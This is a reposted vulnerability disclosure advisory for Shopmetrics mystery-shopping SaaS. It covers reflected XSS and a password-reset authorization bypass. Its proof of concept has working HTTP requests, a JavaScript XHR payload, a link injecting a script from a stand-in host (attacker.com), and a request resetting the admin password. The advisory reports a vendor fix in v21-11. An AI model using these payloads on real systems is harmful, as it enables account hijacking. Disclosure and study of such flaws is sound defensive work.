@@ -1,0 +1,179 @@
+id: 37313
+date: 02/05/2022
+title: Shopmetrics Mystery Shopping Software Broken Access Control / XSS Vulnerability
+author: Vodyasov
+cves: 
+
+=======================================================================
+               title: Broken access control & Cross-Site Scripting
+             product: Shopmetrics Mystery Shopping Software
+  vulnerable version: SaaS platform before v21-11
+       fixed version: SaaS platform v21-11
+          CVE number: n/a for SaaS
+              impact: Critical
+            homepage: https://www.shopmetrics.com/
+               found: 2021-05-06
+                  by: D. Zalmanov (Office Moscow)
+                      A. Vodyasov (Office Moscow)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Founded in 2004, Shopmetrics is a company that offers technology platform
+solutions to mystery shopping and market research providers worldwide. Today
+Shopmetrics is a global organization with offices in North America and Europe.
+With over 80 full-time, dedicated developers and product specialists we are
+committed to providing technology that is the industry benchmark in mystery
+shopping and market research."
+
+Source: https://shopmetrics.com/Company.asp
+
+
+Business recommendation:
+------------------------
+The solution is provided as software as a service. The current version as of v21-11
+already contains the fix and all users should be protected.
+
+An in-depth security analysis performed by security professionals is highly
+advised, as the software may be affected from further security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Reflected cross site scripting
+A reflected cross site scripting vulnerability was identified on
+various input fields in the application. An attacker is able to perform actions
+in the context of the attacked user by exploiting this vulnerability.
+
+
+2) Broken Access Control
+Users of the web application are required to supply a username and password
+combination in order to login. This identification mechanism is used in order
+to ensure that only those who possess the proper credentials are able to login
+to the application, while unauthorized users cannot.
+
+A user who has forgotten or misplaced their password is able to request that
+their password be reset by supplying a valid email address.
+
+Therefore, it is of the utmost importance to ensure that unauthorized users –
+whether accidentally or intentionally – will not be able to step outside the scope
+of their permission boundaries. This means, inter alia, that the tier’s logic may
+not be manipulated by the client-side input and that the logic is confined to
+parameters defined solely by the server.
+
+It was identified that due to flaws in the authorization scheme, an authorization
+bypass vulnerability allows an attacker to get access to the restricted
+password reset functionality, which allows an attacker with knowledge of a valid
+email address, to reset any password and hijack a user account.
+
+
+Proof of concept:
+-----------------
+1) Reflected cross site scripting
+The request to create a new user looks like the following:
+
+-------------------------------------------------------------------------------
+POST /document.asp?alias=mystadministration.user.manage HTTP/2
+[...]
+
+CreateUser_mode=INSERT_COMMIT&PCmsFormID=CreateUser&securityuserobjectid=&type=&Login=&password=password%21&
+firstname=xyz&lastname=xyz&companyname=xyz&gender=M&address1=xyz&address2=xyz&city=xyz&
+state_region=BD&country=GB&language=en-us&postalcode=12312&phonehome=2131221321321&phonework=2132132121321&
+phonemobile=32132121321&fax=213321321321&email=user%40victim.com&timezone=27&defaultWelcomePage=&isdisabled=N
+-------------------------------------------------------------------------------
+
+In a live attack scenario the following JavaScript code will be hosted on the
+attacker's server.
+
+-------------------------------------------------------------------------------
+var data="CreateUser_mode=INSERT_COMMIT&PCmsFormID=CreateUser&securityuserobjectid=&type=&Login=&password=password%21&
+firstname=xyz&lastname=xyz&companyname=xyz&gender=M&address1=xyz&address2=xyz&
+city=xyz&state_region=BD&country=GB&language=en-us&postalcode=12312&phonehome=2131221321321&
+phonework=2132132121321&phonemobile=32132121321&fax=213321321321&email=user%40victim.com&
+timezone=27&defaultWelcomePage=&isdisabled=N";
+var url="https://shopmetricshost/document.asp?alias=mystadministration.user.manage";
+var http=new XMLHttpRequest();
+
+http.open('POST', url, true);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.send(data)
+-------------------------------------------------------------------------------
+
+When the logged-in victim clicks on the following link, the script will be executed
+in the context of the browser and the new user will be created.
+
+-------------------------------------------------------------------------------
+https://shopmetricshost/open/data.asp?post={%22action%22:%22exec%22,%22dataset%22:
+{%22datasetname%22:%22/System/Platform/Globalization/LiteralsGetTranslations%22,%22dataformat%22:%22simple%22,%22datafieldproperties%22:{%22columns%22:[%22name%22]}},
+%22parameters%22:[{%22name%22:%22LiteralIDs%22,
+%22value%22:%22XXX%3C%3E%3Chtml%3E%3Cscript+src%3dhttps%3a//attacker.com%3a4443/payload.js%3E%3C/script%3E%3C/html%3EYYY%22}]}
+-------------------------------------------------------------------------------
+
+
+2) Broken Access Control
+There is a password reset functionality in the application. The following request is
+sent when the user tries to reset the password.
+
+-------------------------------------------------------------------------------
+POST /open/data.asp HTTP/2
+[...]
+
+post={"action"%3a"getdata","dataset"%3a{"datasetname"%3a"/System/Platform/Entities/EntityExecuteActionV2",
+"dataformat"%3a"simple","datafieldproperties"%3a{"columns"%3a["name"]}},
+"parameters"%3a[{"name"%3a"SecurityObjectUserID","value"%3anull},{"name"%3a"Action","value"%3a"U"},
+{"name"%3a"EntityName","value"%3a"ChangePassword"},{"name"%3a"EntityInstanceID","value"%3anull},
+{"name"%3a"ViewStateEventLogAddChunk","value"%3a"¬H¬2¬¬S¬1619442013259¬ ¬aa¬¬2021-04-13_11%3a21%3a¬- ¬P¬¬34|
+BEBC7966-668A-4AC6-B3DE-1180EB3F8704¬S¬0¬- ¬F¬2¬9543¬S¬1¬- ¬I¬¬¬S¬2¬- D¬B¬0¬1¬V-6¬- D¬y¬¬user%40victim.com¬T¬0¬- D¬q.D¬1¬0¬T¬1¬- F¬S¬1¬0¬¬0¬- 
+F¬C¬1¬0¬T¬0¬- x¬S¬1¬0¬¬1¬- x¬C¬1¬0¬T¬0¬- XYZ¬V¬0¬3¬¬101¬- y¬y¬¬newpass¬U¬15162¬- y¬B¬0¬1¬V¬13¬- z¬y¬¬newpass¬U¬5983¬- 
+z¬B¬0-1¬V¬3¬-"},{"name"%3a"EntityAttachmentsList","value"%3anull},{"name"%3a"MiscSettings","value"%3a"[NOREAD][MISC_TOKEN%3aD196E12C550147DEB073F4A1C64EF782B25746008F334B36A6F35A0929AD98DB]"}]}
+-------------------------------------------------------------------------------
+
+There is no integrity check of the parameters of this request. Therefore, an attacker
+can supply any email to this request and the password of the account, which is connected
+to the supplied e-mail, will be changed to the password value controlled by an attacker. For example,
+the request to change the password of the admin user with e-mail admin@victim.com (Administrator user).
+
+-------------------------------------------------------------------------------
+POST /open/data.asp HTTP/2
+[...]
+
+post={"action"%3a"getdata","dataset"%3a{"datasetname"%3a"/System/Platform/Entities/EntityExecuteActionV2",
+"dataformat"%3a"simple","datafieldproperties"%3a{"columns"%3a["name"]}},"parameters"%3a[{"name"%3a"SecurityObjectUserID","value"%3anull},{"name"%3a"Action","value"%3a"U"},{"name"%3a"EntityName","value"%3a"ChangePassword"},
+{"name"%3a"EntityInstanceID","value"%3anull},{"name"%3a"ViewStateEventLogAddChunk","value"%3a"¬H¬2¬¬S¬1619442013259¬ ¬aa¬¬2021-04-13_11%3a21%3a15¬¬0¬- 
+¬ab¬-Mozilla/5.0+(Windows+NT+10.0%3b+Win64%3b+x64%3b+rv%3a88.0)+Gecko/20100101+Firefox/88.0¬¬1¬- ¬P¬¬34|
+BEBC7966-668A-4AC6-B3DE-1180EB3F8704¬S¬0¬- ¬F¬2¬9543¬S¬1¬- ¬I¬¬¬S¬2¬- D¬B¬0¬1¬V-6¬- D¬y¬¬admin%40victim.com¬T¬0¬- D¬q.D¬1¬0¬T¬1¬- F¬S¬1¬0¬¬0¬- 
+F¬C¬1¬0¬T¬0¬- x¬S¬1¬0¬¬1¬- x¬C¬1¬0¬T¬0¬- XYZ¬V¬0¬3¬¬101¬- y¬y¬¬AttackerPassword¬U¬15162¬- y¬B¬0¬1¬V¬13¬- z¬y¬-AttackerPassword¬U¬5983¬- 
+z¬B¬0¬1¬V¬3¬-"},{"name"%3a"EntityAttachmentsList","value"%3anull},
+{"name"%3a"MiscSettings","value"%3a"[NOREAD][MISC_TOKEN%3aD196E12C550147DEB073F4A1C64EF782B25746008F334B36A6F35A0929AD98DB]"}]}
+-------------------------------------------------------------------------------
+
+After this request an attacker can successfully login as admin user with the
+password "AttackerPassword".
+
+
+Vulnerable / tested versions:
+-----------------------------
+No version number is available as the solution is provided as software as a service (SaaS).
+The product was affected by the vulnerability during the timeframe of the test and until
+it was fixed later in 2021.
+
+
+Vendor contact timeline:
+------------------------
+The vendor was contacted through a third party. The vendor confirmed on 7th
+December 2021 that the advisory could be published.
+
+
+Solution:
+---------
+The solution is provided as software as a service. The current version as of v21-11
+contains the fix and all users should be protected.
+
+#  0day.today [2023-03-24]  #
